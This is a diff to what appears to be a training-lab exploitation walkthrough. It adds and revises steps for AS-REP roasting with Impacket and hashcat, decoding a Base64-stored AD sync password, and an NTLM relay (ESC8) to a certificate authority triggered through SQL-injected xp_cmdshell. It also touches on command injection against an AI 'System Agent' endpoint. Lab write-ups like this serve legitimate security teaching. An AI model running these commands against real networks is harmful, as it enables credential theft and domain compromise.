@@ -2,7 +2,7 @@
 
 **Objective:** This guide details the step-by-step exploitation paths for the Modern Kill Lab.
 
-**Attacker Machine:** You can use your own Kali Linux VM or the `Lab-Web01` machine (via SSH) to launch some of these attacks.
+**Attacker Machine:** You can use your own Kali Linux VM (connected to the `psycholab` network) or the `Lab-Web01` machine (via SSH) to launch some of these attacks.
 
 ---
 
@@ -77,7 +77,7 @@ The tool claims to be a "System Agent".
 We want to see if we can escape the intended logic.
 
 * **Payload:** `http://10.0.0.20:5000/ask?query=list files`
-* **Result:** It might fail.
+* **Result:** It might fail, or it might execute `list` as a shell command (which doesn't exist).
 
 ### 3. Command Injection (RCE)
 
@@ -99,10 +99,44 @@ Let's see who we are and steal the K3s config.
 
 ---
 
-## ☁️ VECTOR 3: Hybrid Identity Lateral Movement
+## 🔨 VECTOR 3: AS-REP Roasting (Identity Attack)
+
+**Target:** Active Directory (`Lab-DC01`)  
+**Requirement:** Network access (no credentials needed).
+
+### 1. The Theory
+
+If a user account has "Do not require Kerberos preauthentication" enabled, anyone can request a TGT (Ticket Granting Ticket) for that user. The TGT is encrypted with the user's password hash. We can take that offline and crack it.
+
+### 2. The Execution (Kali)
+
+* **Tool:** Impacket (`GetNPUsers.py`)
+* **Command:**
+  ```bash
+  GetNPUsers.py LAB.local/ -usersfile users.txt -format hashcat -outputfile hashes.asrep -dc-ip 10.0.0.10
+  ```
+  *(Note: You might need a list of potential usernames. "svc_backup" is a good guess).*
+
+* **Targeted Command:**
+  ```bash
+  GetNPUsers.py LAB.local/svc_backup -no-pass -dc-ip 10.0.0.10
+  ```
+
+### 3. The Crack
+
+* **Result:** You receive a hash starting with `$krb5asrep$...`
+* **Action:** Use Hashcat mode 18200.
+  ```bash
+  hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt
+  ```
+* **Password Found:** `Backup2024!`
+
+---
+
+## ☁️ VECTOR 4: Hybrid Identity Lateral Movement
 
 **Target:** Azure AD Connect Decoy (`Lab-DC01`)  
-**Access Required:** You need initial access to DC01 (e.g., via RDP with `vagrant` credentials or via the SQLi shell).
+**Access Required:** You need initial access to DC01 (e.g., via RDP with `vagrant` or `svc_backup` credentials).
 
 ### 1. The Hunt
 
@@ -121,26 +155,25 @@ Attackers look for the "AD Sync" service account passwords which are often store
 
 This "encryption" is usually just Base64 or DPAPI. In this lab, it's Base64.
 
-* **Action:** Open PowerShell or a terminal.
+* **Action:** Open PowerShell.
 * **Command:**
   ```powershell
   [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ=="))
   ```
 * **Result:** `Valhalla123!`
-* **Impact:** You now have the credentials for the `svc_adsync` account, which you can use to attempt DCSync attacks (mimicking cloud replication).
 
 ---
 
-## 🛡️ VECTOR 4: AD CS Relay (ESC8)
+## 🛡️ VECTOR 5: AD CS Relay (ESC8)
 
 **Target:** Certificate Authority (`Lab-DC01`)  
-**Requirement:** An attacker machine (Kali) on the same network (Bridge/NAT) or using `Lab-Web01` to curl.
+**Requirement:** An attacker machine (Kali) on the same network.
 
 ### 1. Verification
 
 * **Action:** Open a browser or use curl.
 * **URL:** `http://10.0.0.10/certsrv`
-* **Observation:** You are prompted for a username and password via a standard browser pop-up.
+* **Observation:** You are prompted for a username/password via HTTP.
 * **Why this is bad:** It is using **HTTP** (unencrypted). If it were HTTPS, relaying would be much harder.
 
 ### 2. The Attack Concept (Steps for Kali)
@@ -158,7 +191,7 @@ This "encryption" is usually just Base64 or DPAPI. In this lab, it's Base64.
    ntlmrelayx.py -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
    ```
 
-3. **Trigger:** Force `Lab-DC01` to authenticate to you (e.g., by using the SQLi vulnerability to `xp_cmdshell 'ping <YOUR_KALI_IP>'`).
+3. **Trigger:** Force `Lab-DC01` to authenticate to you (e.g., via SQLi `xp_cmdshell 'ping <YOUR_KALI_IP>'`).
 
 4. **Result:** NTLMrelayx forwards the machine account credentials to the Cert Authority, requests a certificate, and dumps a `.pfx` file. You can use this certificate to authenticate as the Domain Controller itself.
 
